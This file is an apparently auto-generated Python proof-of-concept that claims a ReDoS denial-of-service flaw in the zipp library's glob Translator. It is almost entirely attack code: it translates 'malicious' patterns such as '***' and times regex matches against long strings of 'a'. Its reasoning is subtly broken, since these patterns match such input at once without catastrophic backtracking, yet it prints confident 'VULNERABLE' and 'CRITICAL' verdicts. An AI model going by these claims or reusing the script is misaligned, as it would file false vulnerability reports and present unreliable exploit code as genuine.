#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: redos-010
# Sink: restrict_rglob
# Auto-generated — run with: python3 redos_star_empty_function_uses_restrict_rglob.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for ReDoS vulnerability in zipp library
(commit 45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)

Vulnerability: The glob pattern translation uses re.sub with a user-controlled
pattern that can cause catastrophic backtracking. Specifically, patterns with
multiple '*' characters create nested quantifiers in the resulting regex.

Impact: An attacker can cause the application to hang indefinitely by sending
a crafted glob pattern, leading to denial of service.

This PoC demonstrates the vulnerability by sending a malicious pattern and
measuring the response time. A vulnerable system will show significant delay.
"""

import re
import time
import sys
import os

# Add the vulnerable library to path
sys.path.insert(0, '/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c')

from zipp.glob import Translator


def test_redos_vulnerability():
    """
    Test if the zipp library is vulnerable to ReDoS by crafting a pattern
    that causes catastrophic backtracking.
    
    The pattern '***' creates nested quantifiers in the regex translation:
    - Each '*' becomes '[^/]*' in the regex
    - Multiple consecutive '*' create patterns like '[^/]*[^/]*[^/]*'
    - When combined with the star_not_empty transformation, this can cause
      exponential backtracking on certain inputs
    """
    
    print("[*] Testing ReDoS vulnerability in zipp library...")
    print("[*] Using Translator class from zipp.glob")
    
    # Create translator instance
    tr = Translator(seps='/')
    
    # Benign pattern for baseline comparison
    benign_pattern = "test.txt"
    
    # Malicious pattern that triggers ReDoS
    # Multiple '*' characters create nested quantifiers
    malicious_pattern = "***"
    
    print(f"\n[*] Testing benign pattern: '{benign_pattern}'")
    start_time = time.time()
    try:
        benign_regex = tr.translate(benign_pattern)
        benign_time = time.time() - start_time
        print(f"[+] Benign pattern translated in {benign_time:.4f}s")
        print(f"[+] Resulting regex: {benign_regex}")
    except Exception as e:
        benign_time = time.time() - start_time
        print(f"[!] Benign pattern failed after {benign_time:.4f}s: {e}")
        return False
    
    print(f"\n[*] Testing malicious pattern: '{malicious_pattern}'")
    start_time = time.time()
    try:
        malicious_regex = tr.translate(malicious_pattern)
        malicious_time = time.time() - start_time
        print(f"[+] Malicious pattern translated in {malicious_time:.4f}s")
        print(f"[+] Resulting regex: {malicious_regex}")
        
        # Now test the regex against a crafted input to trigger backtracking
        print("\n[*] Testing regex against crafted input to trigger backtracking...")
        
        # Create a regex that will cause catastrophic backtracking
        # The pattern '***' translates to something like '[^/]*[^/]*[^/]*'
        # When we try to match against a string with many non-separator characters,
        # the regex engine will try all possible ways to split the match
        
        # Craft input that causes backtracking: many 'a' characters
        test_input = "a" * 30
        
        print(f"[*] Testing regex against input of {len(test_input)} 'a' characters...")
        compiled_regex = re.compile(malicious_regex)
        
        start_time = time.time()
        match = compiled_regex.fullmatch(test_input)
        backtrack_time = time.time() - start_time
        
        print(f"[+] Regex matching took {backtrack_time:.4f}s")
        
        if backtrack_time > 1.0:
            print(f"[!] VULNERABLE: Regex matching took {backtrack_time:.4f}s!")
            print(f"[!] This indicates catastrophic backtracking (ReDoS)")
            return True
        elif backtrack_time > 0.1:
            print(f"[!] POTENTIALLY VULNERABLE: Matching took {backtrack_time:.4f}s")
            print(f"[!] May be vulnerable with larger inputs")
            return True
        else:
            print(f"[-] Not vulnerable: Matching completed quickly ({backtrack_time:.4f}s)")
            return False
            
    except Exception as e:
        malicious_time = time.time() - start_time
        print(f"[!] Malicious pattern failed after {malicious_time:.4f}s: {e}")
        return False


def demonstrate_denial_of_service():
    """
    Demonstrate the denial of service by sending a pattern that causes
    the application to hang for an extended period.
    
    WARNING: This may cause the Python process to hang for several seconds!
    """
    
    print("\n" + "="*60)
    print("[!] WARNING: Demonstrating denial of service...")
    print("[!] This will cause the process to hang for several seconds")
    print("="*60)
    
    # Create a more aggressive malicious pattern
    # More '*' characters = more nested quantifiers = more backtracking
    aggressive_pattern = "*****"
    
    print(f"\n[*] Testing aggressive pattern: '{aggressive_pattern}'")
    print("[*] This pattern creates deeply nested quantifiers in the regex")
    
    tr = Translator(seps='/')
    
    start_time = time.time()
    try:
        regex = tr.translate(aggressive_pattern)
        translation_time = time.time() - start_time
        print(f"[+] Pattern translated in {translation_time:.4f}s")
        print(f"[+] Resulting regex: {regex}")
        
        # Compile and test with a longer input
        compiled = re.compile(regex)
        test_input = "a" * 50
        
        print(f"[*] Testing against {len(test_input)} 'a' characters...")
        print("[*] This may take a while...")
        
        start_time = time.time()
        match = compiled.fullmatch(test_input)
        match_time = time.time() - start_time
        
        print(f"[+] Matching completed in {match_time:.4f}s")
        
        if match_time > 5.0:
            print(f"[!] CRITICAL: Denial of service achieved!")
            print(f"[!] Process hung for {match_time:.4f}s")
            return True
        elif match_time > 1.0:
            print(f"[!] Significant delay: {match_time:.4f}s")
            print(f"[!] Larger inputs would cause longer delays")
            return True
            
    except Exception as e:
        elapsed = time.time() - start_time
        print(f"[!] Error after {elapsed:.4f}s: {e}")
        return False
    
    return False


def main():
    """Main function to run the PoC"""
    
    print("="*60)
    print("ReDoS Vulnerability PoC for zipp library")
    print("="*60)
    print()
    
    # Test 1: Basic vulnerability test
    print("[*] Test 1: Basic ReDoS vulnerability check")
    print("-"*40)
    vulnerable = test_redos_vulnerability()
    
    if vulnerable:
        print("\n[!] VULNERABLE: Library is susceptible to ReDoS attacks")
    else:
        print("\n[-] NOT VULNERABLE: Library appears safe")
        return
    
    # Test 2: Denial of service demonstration
    print("\n[*] Test 2: Denial of Service demonstration")
    print("-"*40)
    dos_possible = demonstrate_denial_of_service()
    
    if dos_possible:
        print("\n[!] CRITICAL: Denial of Service is achievable")
        print("[!] An attacker can cause the application to hang indefinitely")
    else:
        print("\n[-] Denial of Service not demonstrated")
    
    print("\n" + "="*60)
    print("PoC Complete")
    print("="*60)


if __name__ == "__main__":
    main()
